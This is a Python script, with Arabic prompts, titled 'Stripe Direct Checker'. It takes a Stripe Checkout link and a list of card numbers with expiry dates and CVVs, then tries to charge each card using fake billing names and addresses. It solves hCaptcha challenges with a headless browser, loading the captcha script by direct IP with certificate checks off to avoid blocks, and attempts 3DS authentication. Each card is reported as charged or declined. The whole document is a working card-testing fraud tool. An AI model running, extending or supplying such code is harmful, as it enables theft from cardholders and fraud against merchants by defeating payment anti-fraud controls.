#!/usr/bin/env python3
import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio, secrets, traceback
import urllib.parse
from urllib.parse import unquote, urlencode, urljoin, urlparse
from datetime import datetime
from typing import Any, Dict, Optional

try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    print("pip install curl-cffi --break-system-packages"); sys.exit(1)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
STRIPE_VER = "2020-08-27"
HCK = "c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a"
NKEY = ""

class C:
    R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
    CYN="\033[96m";LIME="\033[38;5;118m";GOLD="\033[38;5;214m"

def log(t, color=C.CYN):
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {t}{C.R}")

def decode_fid(fid_or_url: str) -> dict[str, Any]:
    if not fid_or_url: return {}
    raw = str(fid_or_url).strip()
    session_id = None
    m_session = re.search(r"\b(cs_(?:live|test)_[a-zA-Z0-9]+)\b", raw)
    if m_session: session_id = m_session.group(1)
    if "#" in raw: raw = raw.split("#", 1)[1]
    raw = raw.split("?", 1)[0]
    if "_secret_" in raw:
        parts = raw.split("_secret_", 1)
        if not session_id and parts[0].startswith("cs_"): session_id = parts[0]
        raw = parts[1]
    unquoted = urllib.parse.unquote(raw)
    b64_str = unquoted.strip().rstrip("%")
    if not b64_str: return {}
    pad = b64_str + "=" * (-len(b64_str) % 4)
    try: decoded_bytes = base64.b64decode(pad, altchars=b"-_")
    except Exception:
        try: decoded_bytes = base64.b64decode(pad)
        except Exception: return {}
    xored_bytes = bytes(b ^ 5 for b in decoded_bytes)
    xored_text = xored_bytes.decode("utf-8", errors="replace").strip()
    try: data = json.loads(xored_text)
    except json.JSONDecodeError: return {}
    if not isinstance(data, dict): return {"value": data}
    if session_id:
        if "checkoutSessionId" not in data and "sessionId" not in data: data["checkoutSessionId"] = session_id
        if "client_secret" not in data: data["client_secret"] = f"{session_id}_secret_{b64_str}"
    return data

def is_param_error(msg):
    m = (msg or "").lower()
    return ("unknown parameter" in m or "parameter_unknown" in m
            or "received unknown" in m or "did you mean" in m)

async def _get_hcaptcha_ip():
    log("[dns] Asking Cloudflare for hCaptcha IP to bypass VPN block...", C.GOLD)
    session = AsyncSession(impersonate="chrome", timeout=10)
    try:
        r = await session.get("https://1.1.1.1/dns-query?name=js.hcaptcha.com&type=A", headers={"accept": "application/dns-json"})
        data = r.json()
        if "Answer" in data and len(data["Answer"]) > 0:
            ip = data["Answer"][0]["data"]
            log(f"[dns] Found IP: {ip}", C.LIME)
            return ip
    except Exception as e:
        log(f"[dns] Failed to resolve via DoH: {e}", C.RED)
    finally:
        await session.close()
    return None

async def _run_playwright_hcaptcha(checkout_url, rqdata=None, sitekey=None):
    if not sitekey:
        log("[playwright] missing sitekey", C.RED)
        return None

    ip_addr = await _get_hcaptcha_ip()
    if not ip_addr:
        return None

    log("[curl_cffi] Downloading script from direct IP (ignoring SSL)...", C.GOLD)
    hc_script_text = ""
    session = AsyncSession(impersonate="chrome", timeout=15)
    try:
        # التعديل هنا: إضافة verify=False
        r = await session.get(f"https://{ip_addr}/1/api.js?render=explicit", headers={"Host": "js.hcaptcha.com"}, verify=False)
        if r.status_code == 200:
            hc_script_text = r.text
            log(f"[curl_cffi] Script downloaded ({len(hc_script_text)} bytes)", C.LIME)
    except Exception as e:
        log(f"[curl_cffi] Error: {e}", C.RED)
    finally:
        await session.close()

    if not hc_script_text:
        return None

    hc_file_path = "hc_script.js"
    with open(hc_file_path, "w") as f:
        f.write(hc_script_text)

    node_script = """
    const { chromium } = require('playwright');
    const fs = require('fs');
    const url = process.argv[2];
    const sitekey = process.argv[3];
    const rqdata = process.argv[4];
    const hc_file = process.argv[5];
    const hc_script = fs.readFileSync(hc_file, 'utf8');

    (async () => {
        try {
            const browser = await chromium.launch({
                executablePath: '/usr/bin/chromium-browser',
                headless: true,
                args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            });
            const context = await browser.newContext({ bypassCSP: true });
            const page = await context.newPage();
            
            await page.goto(url, { waitUntil: 'domcontentloaded' });
            await page.addScriptTag({ content: hc_script });
            await page.waitForTimeout(2000);
            
            const token = await page.evaluate(async ({sitekey, rqdata}) => {
                if (typeof hcaptcha === 'undefined') return 'undefined_hcaptcha';
                return new Promise((resolve) => {
                    const holder = document.createElement('div');
                    document.body.appendChild(holder);
                    const wid = hcaptcha.render(holder, {
                        sitekey: sitekey, size: 'invisible', rqdata: rqdata,
                        callback: (tok) => resolve(tok),
                        'error-callback': (e) => resolve('error_' + e)
                    });
                    hcaptcha.execute(wid, {rqdata: rqdata});
                });
            }, {sitekey, rqdata});
            
            console.log(token);
            await browser.close();
        } catch (e) {
            console.log('NODE_EXC: ' + e.message);
        }
    })();
    """
    node_file_path = "solver.js"
    with open(node_file_path, "w") as f:
        f.write(node_script)

    log("[playwright] Running Node.js Playwright solver...", C.GOLD)
    try:
        process = await asyncio.create_subprocess_exec(
            "node", node_file_path, checkout_url, sitekey, (rqdata or ""), hc_file_path,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        out = stdout.decode().strip()
        
        if out and len(out) > 50 and not out.startswith("error_") and not out.startswith("NODE_EXC"):
            log(f"[playwright] token OK ({len(out)} chars)", C.LIME)
            return out
            
        log(f"[playwright] token invalid: {out}", C.RED)
        return None
    except Exception as e:
        log(f"[playwright] EXC: {str(e)}", C.RED)
        return None

_SRC_PREFIXES = ("src_", "tdsrc_", "pi_3ds_")
def _is_src(v): return isinstance(v, str) and any(v.startswith(p) for p in _SRC_PREFIXES)

def find_source_recursive(obj, depth=0, max_depth=12):
    if depth > max_depth: return None
    if isinstance(obj, str): return obj if _is_src(obj) else None
    if isinstance(obj, dict):
        for k in ("source", "three_d_secure_2_source", "three_ds_2_source", "sourceId", "source_id", "id"):
            if k in obj:
                v = obj[k]
                if _is_src(v): return v
                if isinstance(v, dict) and _is_src(v.get("id")): return v["id"]
        for v in obj.values():
            r = find_source_recursive(v, depth + 1, max_depth)
            if r: return r
    if isinstance(obj, list):
        for item in obj:
            r = find_source_recursive(item, depth + 1, max_depth)
            if r: return r
    return None

class StripeSession:
    def __init__(self, url):
        self.url = url.strip()
        self.pk = ""; self.cs = ""; self.acct = None
        self.merchant = "Stripe"; self.amount_str = "N/A"; self.raw_amount = 0
        self.session = None; self.email = ""
        self.init_json = {}; self.hcaptcha_sitekey = HCK
        self.tracking = {"muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "guid": str(uuid.uuid4())}
        self._current_card = None; self._current_pm_id = None

    def _hdrs(self, ref=None):
        h = {
            "accept": "application/json", "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": ref or f"https://checkout.stripe.com/c/pay/{self.cs}",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": UA, "stripe-version": STRIPE_VER, "x-stripe-userdata": "{}",
        }
        if self.acct: h["stripe-account"] = self.acct
        return h

    async def prefetch(self):
        fid = decode_fid(self.url)
        self.cs = fid.get("checkoutSessionId") or ""
        self.pk = fid.get("apiKey") or ""
        self.acct = fid.get("stripeAccount")
        if not self.cs:
            m = re.search(r"cs_(?:live|test)_[A-Za-z0-9]+", self.url)
            if m: self.cs = m.group(0)
        if not self.pk or not self.cs: return False, "missing cs/pk"
        
        if self.session: await self.session.close()
        self.session = AsyncSession(impersonate="chrome", timeout=30)
        
        try:
            await self.session.get(f"https://checkout.stripe.com/c/pay/{self.cs}", headers={**self._hdrs(), "accept": "text/html,*/*"})
        except Exception as e:
            log(f"Network Error on prefetch: {e}", C.RED)
        
        async def do_telemetry():
            try:
                tel = {"v":2,"tag":"5.6.8_js_fp","src":"checkout-inner-live-v3","a":{"a": self.pk, "b": f"https://checkout.stripe.com/c/pay/{self.cs}","c": 24, "d": "1920x1080", "e": False, "f": "en-US", "g": "Win32","h": UA, "i": -300, "j": False, "k": 8, "l": 8}}
                r = await self.session.post("https://m.stripe.com/6", json=tel, headers={"content-type":"application/json","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA})
                if r.status_code == 200:
                    j = r.json()
                    for k in ("muid","sid","guid"):
                        if j.get(k): self.tracking[k] = j[k]
            except: pass
        
        async def do_init():
            try:
                body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
                r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init", headers=self._hdrs(), data=body)
                return r.json()
            except Exception as e: return {"_err": str(e)[:80]}
        
        tel_task = asyncio.create_task(do_telemetry())
        init_task = asyncio.create_task(do_init())
        _, j = await asyncio.gather(tel_task, init_task, return_exceptions=True)
        
        if not isinstance(j, dict) or "_err" in j:
            return False, j.get("_err", "init failed") if isinstance(j, dict) else "init failed"
        if "error" in j:
            e = j["error"]; return False, f"{e.get('code')}: {e.get('message')}"
        
        ac = j.get("account_settings") or {}
        self.merchant = ac.get("display_name") or ac.get("business_name") or "Stripe Merchant"
        cu = j.get("customer") or {}; self.email = cu.get("email") or j.get("customer_email") or ""
        ts = j.get("total_summary") or {}; inv = j.get("invoice") or {}
        lig = j.get("line_item_group") or {}; pi = j.get("payment_intent") or {}
        self.raw_amount = (ts.get("due") or ts.get("total") or inv.get("amount_due") or inv.get("total") or lig.get("total") or pi.get("amount") or 0)
        curr = (j.get("currency") or "usd").upper()
        self.amount_str = f"{self.raw_amount/100:.2f} {curr}" if self.raw_amount else "N/A"
        self.init_json = j
        
        try:
            passive = j.get("passive_captcha") or {}
            if not passive and isinstance(j.get("account_settings"), dict):
                passive = j["account_settings"].get("passive_captcha") or {}
            sk = (passive.get("site_key") or passive.get("sitekey") or passive.get("key") or j.get("captcha_site_key"))
            if sk and isinstance(sk, str) and len(sk) > 10: self.hcaptcha_sitekey = sk
        except Exception: pass
        return True, None

    async def _tokenize(self, card):
        name = random.choice(["James Smith","John Doe","Alex Turner","Michael Brown"])
        email = self.email or f"user{random.randint(1000,99999)}@gmail.com"
        data = {
            "type": "card", "card[number]": card["cc"], "card[cvc]": card["cvv"],
            "card[exp_month]": card["mm"], "card[exp_year]": card["yy"],
            "billing_details[name]": name, "billing_details[email]": email,
            "billing_details[address][country]": "US", "billing_details[address][line1]": f"{random.randint(100,9999)} Main St",
            "billing_details[address][city]": "New York", "billing_details[address][postal_code]": "10001",
            "billing_details[address][state]": "NY", "payment_user_agent": SJUA,
            "time_on_page": str(random.randint(45000, 120000)),
            "guid": self.tracking["guid"], "muid": self.tracking["muid"], "sid": self.tracking["sid"], "key": self.pk,
        }
        if self.cs and self.cs.startswith("cs_"):
            data["client_attribution_metadata[client_session_id]"] = self.cs
            data["client_attribution_metadata[merchant_integration_source]"] = "checkout"
            data["client_attribution_metadata[merchant_integration_version]"] = "hosted_checkout"
            data["client_attribution_metadata[payment_method_selection_flow]"] = "automatic"
        try:
            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs())
            j = r.json()
            if "error" in j:
                e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
            return j.get("id"), None, None
        except Exception as e: return None, "net", str(e)[:80]

    async def _confirm_variants(self, pm_id):
        total = self.raw_amount; checksum = self.init_json.get("init_checksum", ""); config_id = self.init_json.get("config_id", "")
        common = {
            "payment_method": pm_id, "expected_payment_method_type": "card",
            "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
            "client_attribution_metadata[client_session_id]": self.cs,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "muid": self.tracking["muid"], "sid": self.tracking["sid"], "guid": self.tracking["guid"],
        }
        if config_id: common["client_attribution_metadata[checkout_config_id]"] = config_id
        if total > 0:
            common["expected_amount"] = total
            common["last_displayed_line_item_group_details[subtotal]"] = total
            common["last_displayed_line_item_group_details[total_exclusive_tax]"] = 0
            common["last_displayed_line_item_group_details[total_inclusive_tax]"] = 0
            common["last_displayed_line_item_group_details[total_discount_amount]"] = 0
            common["last_displayed_line_item_group_details[shipping_rate_amount]"] = 0
        
        variants = []
        v = dict(common); v["eid"] = "NA"
        if checksum: v["init_checksum"] = checksum
        variants.append(("V1_NA_checksum", v))
        v = dict(common); v["eid"] = "NA"; variants.append(("V2_NA_nochecksum", v))
        v = dict(common); v["eid"] = str(uuid.uuid4())
        if checksum: v["init_checksum"] = checksum
        variants.append(("V3_UUID_checksum", v))
        
        last_err = None
        for label, data in variants:
            try:
                r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs(), timeout=15)
                j = r.json()
                if "error" not in j: return j, label
                msg = j["error"].get("message", "")
                if is_param_error(msg): last_err = j; continue
                if "confirming the Checkout Session" not in msg: return j, label
                last_err = j
            except Exception as e: last_err = {"error": {"message": str(e)[:80]}}
        return last_err or {"error": {"message": "all failed"}}, "ALL_FAILED"

    async def _authenticate_source(self, source, client_secret):
        data = {"key": self.pk, "source": source, "client_secret": client_secret, "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05", "three_d_secure_2[device_render_options][sdk_interface]": "03", "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01", "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true", "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y", "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true", "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24", "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920", "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA, "browser[browserAcceptHeader]": "text/html,*/*;q=0.8"}
        hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA,"stripe-version":STRIPE_VER}
        try:
            r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=15)
            return r.json()
        except Exception as e: return {"error": {"message": str(e)[:80]}}

    async def _verify_challenge(self, pi_id, client_secret, token=""):
        endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
        data = {"key": self.pk, "client_secret": client_secret}
        if token: data["captcha_response"] = token
        try:
            r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data=data, headers=self._hdrs(), timeout=15)
            return r.json()
        except Exception as e: return {"error": {"message": str(e)[:80]}}

    async def _handle_waf(self, conf, pi):
        na = pi.get("next_action") or conf.get("next_action") or {}
        use_sdk = na.get("use_stripe_sdk") or {}; sjs = use_sdk.get("stripe_js") or {}
        pi_id = pi.get("id"); cs_secret = pi.get("client_secret")
        
        rqdata = (sjs.get("rqdata") or conf.get("rqdata") or (pi.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")))
        site_key = (sjs.get("site_key") or sjs.get("captcha_site_key") or getattr(self, "hcaptcha_sitekey", HCK) or HCK)
        
        log(f"WAF -> rq={bool(rqdata)}", C.GOLD)
        
        if pi_id and cs_secret:
            log("S2: verify no-token", C.GOLD)
            r = await self._verify_challenge(pi_id, cs_secret, "")
            if isinstance(r, dict):
                vpi = r.get("payment_intent") or r.get("setup_intent") or r
                st = vpi.get("status", "") if isinstance(vpi, dict) else ""
                if st in ("succeeded","requires_capture","complete"):
                    return {"success": True, "status": "CHARGED", "message": f"Verify ({st})", "raw": r}
        
        if self.cs:
            log("S4: Playwright (Node.js) Browser", C.GOLD)
            checkout_url = f"https://checkout.stripe.com/c/pay/{self.cs}"
            token = await _run_playwright_hcaptcha(checkout_url, rqdata, site_key)
            if token:
                log("  Got hCaptcha token! Verifying...", C.LIME)
                r = await self._verify_challenge(pi_id, cs_secret, token)
                if isinstance(r, dict):
                    vpi = r.get("payment_intent") or r.get("setup_intent") or r
                    st = vpi.get("status", "") if isinstance(vpi, dict) else ""
                    if st in ("succeeded","requires_capture","complete"):
                        return {"success": True, "status": "CHARGED", "message": f"Playwright ({st})", "raw": r}
        return {"success": False, "status": "CAPTCHA_FAIL", "message": "WAF unrecoverable"}

    async def _handle_3ds(self, conf, pi, source):
        if not isinstance(pi, dict): pi = {}
        na = pi.get("next_action") or conf.get("next_action") or {}
        sdk = na.get("use_stripe_sdk") or na
        pi_id = pi.get("id") or (conf.get("payment_intent") or {}).get("id")
        cs_secret = pi.get("client_secret") or conf.get("client_secret")
        stid = sdk.get("three_ds_server_trans_id") or sdk.get("server_transaction_id") or sdk.get("threeDSServerTransID")
        method_url = sdk.get("three_ds_method_url") or sdk.get("methodURL")
        notify_url = sdk.get("three_ds_method_notification_url") or "https://hooks.stripe.com/3ds2/fingerprint/complete"
        if method_url and stid:
            log("3DS: fingerprint", C.CYN)
            method_obj = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
            method_b64 = base64.b64encode(json.dumps(method_obj, separators=(",", ":")).encode()).decode().rstrip("=").replace("+", "-").replace("/", "_")
            try:
                await self.session.post(method_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
                await self.session.post(notify_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
            except: pass
            await asyncio.sleep(1)
        src = source or find_source_recursive(sdk) or find_source_recursive(conf)
        if src:
            log("3DS: authenticate", C.CYN)
            result = await self._authenticate_source(src, cs_secret)
            if isinstance(result, dict):
                st = result.get("status") or result.get("state", "")
                if st in ("succeeded","requires_capture"):
                    return {"success": True, "status": "CHARGED", "message": "3DS OK", "raw": result}
        return {"success": False, "status": "3DS_OTP", "message": "OTP required"}
    
    async def charge(self, card):
        res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
        t0 = time.time(); self._current_card = card
        try:
            pm_id, code, msg = await self._tokenize(card)
            if not pm_id:
                if code in ("resource_missing","checkout_session_expired"):
                    res["status"] = "SESSION_EXPIRED"; res["message"] = f"{code}: {msg}"
                else:
                    res["status"] = "DECLINED"; res["message"] = f"{(code or '').upper()}: {msg}".strip(": ")
                res["response_time"] = time.time() - t0; return res
            
            self._current_pm_id = pm_id
            conf, variant = await self._confirm_variants(pm_id)
            res["variant"] = variant; res["response_time"] = time.time() - t0
            
            err = conf.get("error") or {}
            if err:
                code = err.get("decline_code") or err.get("code") or ""
                msg = err.get("message", "")
                if code in ("resource_missing","checkout_session_expired"):
                    res["status"] = "SESSION_EXPIRED"; res["message"] = f"{code}: {msg}"; return res
                res["status"] = "DECLINED"; res["message"] = f"{code.upper()}: {msg}".strip(": "); return res
            
            pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
            st = pi.get("status") or conf.get("status") or ""
            if st in ("succeeded","requires_capture","complete") or conf.get("payment_status") == "paid":
                res["status"] = "CHARGED"; res["message"] = "Success"; res["success"] = True; return res
            
            if st == "requires_action":
                na = pi.get("next_action") or {}
                use_sdk = na.get("use_stripe_sdk") or {}
                sdk_type = (use_sdk.get("type") or na.get("type") or "").lower()
                sjs = use_sdk.get("stripe_js") or {}
                is_waf = ("intent_confirmation_challenge" in sdk_type or "captcha" in sdk_type or bool(sjs.get("rqdata")))
                if is_waf:
                    waf = await self._handle_waf(conf, pi)
                    res["status"] = waf.get("status","CAPTCHA_FAIL"); res["message"] = waf.get("message",""); res["success"] = waf.get("success", False)
                    return res
                three = await self._handle_3ds(conf, pi, None)
                res["status"] = three.get("status","3DS"); res["message"] = three.get("message",""); res["success"] = three.get("success", False)
                return res
            res["status"] = st.upper() if st else "UNKNOWN"
            return res
        except Exception as e:
            res["message"] = f"{type(e).__name__}: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res
    
    async def close(self):
        if self.session: await self.session.close()

def parse_card(line):
    p = re.split(r'[|/\s,]+', line.strip())
    if len(p) < 4: return None
    cc = re.sub(r'\D', '', p[0])
    if not (13 <= len(cc) <= 19): return None
    try: mm = p[1].strip().zfill(2); _ = int(mm)
    except: return None
    if not (1 <= int(mm) <= 12): return None
    yy = p[2].strip()
    if len(yy) == 2: yy = "20" + yy
    if not (yy.isdigit() and len(yy) == 4): return None
    cvv = re.sub(r'\D', '', p[3])
    if len(cvv) not in (3, 4): return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

async def main():
    print(f"{C.CYN}{C.B}═══ Stripe Direct Checker ═══{C.R}\n")
    
    url = input(f"{C.GOLD}▸ أدخل رابط Stripe Checkout: {C.R}").strip()
    if not url.startswith("http"):
        print(f"{C.RED}❌ رابط غير صالح.{C.R}")
        return

    print(f"\n{C.GOLD}▸ أدخل البطاقات (CC|MM|YY|CVV). لما تخلص اكتب 'done':{C.R}")
    cards_input = []
    while True:
        line = input("  > ").strip()
        if line.lower() == 'done': break
        if line: cards_input.append(line)
            
    cards = [parse_card(c) for c in cards_input]
    cards = [c for c in cards if c]
    
    if not cards:
        print(f"{C.RED}❌ مفيش بطاقات صالحة.{C.R}")
        return
        
    print(f"\n{C.LIME}🚀 بدء فحص {len(cards)} بطاقة...{C.R}\n")
    
    for i, card in enumerate(cards, 1):
        print(f"{C.CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.R}")
        print(f"{C.YEL}⏳ بطاقة [{i}/{len(cards)}]: {card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}{C.R}")
        
        sess = StripeSession(url)
        ok, err = await sess.prefetch()
        if not ok:
            print(f"{C.RED}❌ فشل الاتصال بالجلسة: {err}{C.R}\n")
            await sess.close()
            continue
            
        print(f"🛒 المتجر: {sess.merchant} | المبلغ: {sess.amount_str}")
        
        res = await sess.charge(card)
        await sess.close()
        
        color = C.LIME if res['status'] in ('CHARGED', 'LIVE') else C.RED if res['status'] == 'DECLINED' else C.GOLD
        icon = "✅" if res['status'] == 'CHARGED' else "❌" if res['status'] == 'DECLINED' else "⚠️"
        
        print(f"{color}{icon} النتيجة: {res['status']}{C.R}")
        print(f"▸ الرسالة: {res['message']}")
        print(f"▸ الوقت: {res['response_time']:.1f}s\n")
        
        await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C.RED}تم الإيقاف.{C.R}")
        sys.exit(0)
